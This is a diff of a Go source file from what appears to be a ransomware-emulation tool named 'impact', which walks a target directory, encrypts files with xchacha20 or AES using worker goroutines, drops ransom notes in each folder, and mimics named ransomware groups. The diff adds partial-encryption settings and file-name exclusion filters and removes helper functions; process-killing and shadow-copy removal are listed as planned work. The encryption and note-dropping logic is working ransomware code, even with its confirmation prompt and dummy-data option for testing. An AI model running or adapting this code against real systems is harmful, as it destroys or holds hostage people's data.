@@ -1,30 +1,23 @@
 package main
 
-// TODO - File Name Exclusions
-// TODO - File Extension Inclusions
-// TODO - File Extension Exclusions
 // TODO - Process Terminations
 // TODO - VSS Removals
-// TODO - Directory Exclusions
-// TODO - Configurable Encryption Percentage
-// TODO - Configurable Full Encrypt Threshold
+// TODO - EDS Validation Mechanism
+// TODO - Revisit ECC Encryption Implementation as it's actually using AES right now and ECC keys are basically an input to this
 
 import (
-	r "crypto/rand"
 	"embed"
 	"errors"
 	"flag"
 	"fmt"
 	"github.com/abakum/embed-encrypt/encryptedfs"
-	"gopkg.in/yaml.v3"
-	"io"
 	"math/rand"
 	"os"
 	"path/filepath"
+	"regexp"
 	"slices"
 	"strings"
 	"sync"
-	"time"
 )
 
 // go run github.com/abakum/embed-encrypt - When config updates, use this to regenerate necessary data.
@@ -56,8 +49,8 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 	// Encryption/Decryption Parameters - will override group settings if used for encryption/decryption
 	decrypt := flag.Bool("decrypt", false, "Attempt to decrypt using specified options - must include RSA Private Key and Group Name OR Cipher Used")
 	sym_cipher := flag.String("cipher", "", "Specify Symmetric Cipher for Encryption/Decryption")
-	encryption_percent := flag.Int("ep", 25, "What percentage of files over the max default 100% threshold to encrypt")
-	threshold_auto_fullencrypt := flag.Int64("threshold", 1024, "File size in bytes to automatically encrypt 100% of the contents if file Size < THIS")
+	encryption_percent := flag.Int("ep", 25, "Percentage of data to encrypt in each file over the 100%-auto threshold")
+	threshold_auto_fullencrypt := flag.Int64("threshold", 1024, "File size in bytes to automatically encrypt 100% of the contents if file Size <= provided number")
 	workers := flag.Int("workers", 25, "How many goroutines to use for encryption")
 
 	// Offensive
@@ -150,6 +143,14 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 		}
 	}
 
+	if (*encryption_percent > 100 || *encryption_percent <= 0) && !*decrypt {
+		return nil, errors.New("Encryption Percent must be >0 and <=100")
+	}
+
+	if *threshold_auto_fullencrypt <= 0 {
+		return nil, errors.New("Threshold must be >0")
+	}
+
 	arguments := map[string]any{
 		"target":                     *targetDirectory,
 		"method":                     *method,
@@ -168,10 +169,10 @@ func parseArgs(groups []RansomActor) (map[string]any, error) {
 		"decrypt":                    *decrypt,
 		"sym_cipher":                 *sym_cipher,
 		"generate_keys":              *generate_keys,
-		"killprocs":                  *killprocs,                  // TODO
-		"vss":                        *vss,                        // TODO
-		"encryption_percent":         *encryption_percent,         // TODO
-		"threshold_auto_fullencrypt": *threshold_auto_fullencrypt, // TODO
+		"killprocs":                  *killprocs, // TODO
+		"vss":                        *vss,       // TODO
+		"encryption_percent":         *encryption_percent,
+		"threshold_auto_fullencrypt": *threshold_auto_fullencrypt,
 	}
 
 	return arguments, nil
@@ -304,7 +305,11 @@ func main() {
 		} else {
 			fmt.Print("impact is about to encrypt data in target directory %s - please type 'confirm' to proceed:")
 		}
-		fmt.Scan(&con)
+		_, err := fmt.Scan(&con)
+		if err != nil {
+			printFormattedMessage(fmt.Sprintf("Error scanning input: %s", err.Error()), ERROR)
+			return
+		}
 		if con != "confirm" {
 			printFormattedMessage(fmt.Sprintf("Abandoning Execution due to lack of confirmation: %s", con), ERROR)
 			return
@@ -321,7 +326,7 @@ func main() {
 	}
 	allowed_symmetric_ciphers := []string{"xchacha20", "aes256"}
 	if !slices.Contains(allowed_symmetric_ciphers, sym_cipher) {
-		printFormattedMessage(fmt.Sprintf("Cipher not implemented: %s", sym_cipher), ERROR)
+		printFormattedMessage(fmt.Sprintf("Symmetric Cipher not implemented: %s", sym_cipher), ERROR)
 		return
 	}
 
@@ -345,20 +350,39 @@ func main() {
 	recursiveBool := args["recursive"].(bool)
 	generateDecryptInstructions(target_dir, asymKeys, sym_cipher, recursiveBool)
 
+	// These are only necessary for encryption - not decryption
+	config.ThresholdFullEncrypt = args["threshold_auto_fullencrypt"].(int64)
+	config.EncryptionPercent = args["encryption_percent"].(int)
+
 	// ewg is closed once all workers are finished encrypting, fileTargetChannel is closed once all files have been pushed to the channel
 	for i := 0; i < args["workers"].(int); i++ {
 		ewg.Add(1)
-		go encryptionWorker(fileTargetChannel, &ewg, noteName, method, sym_cipher, extension, asymKeys, decryptEnabled, group)
+		go encryptionWorker(fileTargetChannel, &ewg, noteName, method, sym_cipher, extension, asymKeys, decryptEnabled, group, config)
 	}
-	findFileTargets(target_dir, note, noteName, recursiveBool, fileList, fileTargetChannel, args["decrypt"].(bool))
+
+	// Regex setup for file name-contains skips when doing encryption checks
+	regexString := ""
+	for i, v := range config.FileNameExclusions {
+		if i == 0 {
+			regexString = fmt.Sprintf(".*%s.*", strings.ToLower(v))
+		} else {
+			regexString = fmt.Sprintf("%s|.*%s.*", regexString, strings.ToLower(v))
+		}
+	}
+	fileNameSkipRegex, err = regexp.Compile(regexString)
+	if err != nil {
+		printFormattedMessage(err.Error(), ERROR)
+		return
+	}
+
+	findFileTargets(target_dir, note, noteName, recursiveBool, fileList, fileTargetChannel, args["decrypt"].(bool), &config)
 	ewg.Wait()
 }
 
-func findFileTargets(targetDir string, note string, noteName string, recursive bool, fileList []string, c chan File, decrypt bool) {
+func findFileTargets(targetDir string, note string, noteName string, recursive bool, fileList []string, c chan File, decrypt bool, config *Config) {
 	// Each unique directory that we encounter, including base, should receive a ransomware note creation
 	// If len(fileList) == 0, we did NOT create files explicitly for this test and as such, will be flat-scanning or recursively iterating
 	// Flat scanning is easy - we can populate right now
-	// TODO Exclusions of key dirs/file types
 	ransomwareNoteDirs := make([]string, 0)
 	if !recursive && len(fileList) == 0 {
 		// We have not created any files to encrypt and just want top-level
@@ -366,6 +390,7 @@ func findFileTargets(targetDir string, note string, noteName string, recursive b
 	}
 	if len(fileList) != 0 {
 		// We have populated file-list - either from top-level or created files
+		// We won't filter if it's non-recursive, just do all since we assume it's highly targeted for a reason
 		for _, v := range fileList {
 			baseDir := filepath.Dir(v)
 			if !slices.Contains(ransomwareNoteDirs, baseDir) && !decrypt {
@@ -391,6 +416,14 @@ func findFileTargets(targetDir string, note string, noteName string, recursive b
 				if info.IsDir() {
 					return nil
 				}
+
+				// Only do filters if we are encrypting, not decrypting
+				if !decrypt {
+					if !shouldProcessFile(path, config) {
+						return nil
+					}
+				}
+
 				//fmt.Println(filepath.Ext(path))
 				baseDir := filepath.Dir(path)
 				if !slices.Contains(ransomwareNoteDirs, baseDir) && !decrypt {
@@ -406,120 +439,4 @@ func findFileTargets(targetDir string, note string, noteName string, recursive b
 			})
 	}
 	close(c)
-}
-
-func createNote(note string, noteName string, destDir string) {
-	f, _ := os.Create(filepath.Join(destDir, noteName))
-	f.Write([]byte(note))
-	f.Close()
-}
-
-func gatherFiles(fileList []string, recursive bool, targetDir string) ([]string, error) {
-	if !recursive {
-		files, _ := os.ReadDir(targetDir)
-		for _, v := range files {
-			if v.IsDir() {
-				continue
-			}
-			fileList = append(fileList, filepath.Join(targetDir, v.Name()))
-		}
-	} else {
-		filepath.Walk(targetDir,
-			func(path string, info os.FileInfo, err error) error {
-				fileList = append(fileList, path)
-				fmt.Println(path, info.Size())
-				return nil
-			})
-	}
-	return fileList, nil
-}
-
-func replaceExtensionVariables(extension string) string {
-	var runes = []rune("abcdefghijklmnopqrstuvwxyz0123456789")
-	for true {
-		if strings.Contains(extension, "%R") {
-			extension = strings.Replace(extension, "%R", string(runes[rand.Intn(len(runes))]), 1)
-		} else {
-			break
-		}
-	}
-	return extension
-}
-
-// CreateFiles - Handles the creation of dummy data inside the target directory
-func CreateFiles(fileCount int, fileSize int, targetdir string) (error, []string) {
-	printFormattedMessage(fmt.Sprintf("Creating Dummy Data inside directory: %s", targetdir), INFO)
-	printFormattedMessage(fmt.Sprintf("Target Size: %d Megabytes", fileSize), INFO)
-	printFormattedMessage(fmt.Sprintf("Target File Count: %d", fileCount), INFO)
-	fileList := make([]string, 0)
-	// Makes a random number of subdirectories followed by numbers and dates and distributes chunks of files into them
-	validDirs := make([]string, 0)
-	subdir_count := rand.Intn(20) + 3
-	for i := 0; i < subdir_count; i++ {
-		tmp := filepath.Join(targetdir, fmt.Sprintf("%s_%d_%d_%d", subdir_names[rand.Intn(len(subdir_names))], time.Now().Year(), rand.Intn(12), rand.Intn(60)))
-		err := makeDirectory(tmp)
-		if err != nil {
-			printFormattedMessage(fmt.Sprintf("Error Creating Directory: %s", err.Error()), ERROR)
-			continue
-		}
-		validDirs = append(validDirs, tmp)
-	}
-	// Now we have a set of directories to load files into
-	// We will distribute the files as evenly as possible between the directories
-	targetFileSizeMegabytes := float64(fileSize) / float64(fileCount)
-	targetFileSizeBytes := int(targetFileSizeMegabytes * (1 << 20))
-	filesPerDirectory := fileCount / len(validDirs)
-	var wg sync.WaitGroup
-	for _, v := range validDirs {
-		wg.Add(1)
-		go func() {
-			defer wg.Done()
-			for i := 0; i < filesPerDirectory; i++ {
-				tmpFileName := fmt.Sprintf("%s_%s_%d_%d_%d.%s", file_names[rand.Intn(len(file_names))], subFileNames[rand.Intn(len(subFileNames))], rand.Intn(30), time.Now().Year(), rand.Intn(60), dummy_extensions[rand.Intn(len(dummy_extensions))])
-				tmpFileFull := filepath.Join(v, tmpFileName)
-				f, err := os.Create(tmpFileFull)
-				if err != nil {
-					printFormattedMessage(fmt.Sprintf("Error Creating File: %s", err.Error()), ERROR)
-					continue
-				}
-				io.Copy(f, io.LimitReader(r.Reader, int64(targetFileSizeBytes)))
-				fileList = append(fileList, tmpFileFull)
-				f.Close()
-			}
-		}()
-	}
-	wg.Wait()
-	return nil, fileList
-}
-
-func makeDirectory(dir string) error {
-	err := os.Mkdir(dir, os.ModeDir)
-	if err != nil && !os.IsExist(err) {
-		return err
-	}
-	return nil
-}
-
-// ReadConfig - Handles reading the embedded configuration file containing ransomware group metadata
-func ReadConfig() (Config, error) {
-	var tmp Config
-	var data []byte
-	var readerr error
-	data, readerr = configFile.ReadFile("config.yaml")
-	if readerr != nil {
-		return tmp, readerr
-	}
-	err := yaml.Unmarshal(data, &tmp)
-	if err != nil {
-		return tmp, fmt.Errorf("YAML Unmarshal Error: %w", err)
-	}
-	return tmp, err
-}
-
-func doesOSEntryExist(dir string) error {
-	if _, err := os.Stat(dir); err != nil {
-		return err
-	}
-	return nil
-
 }
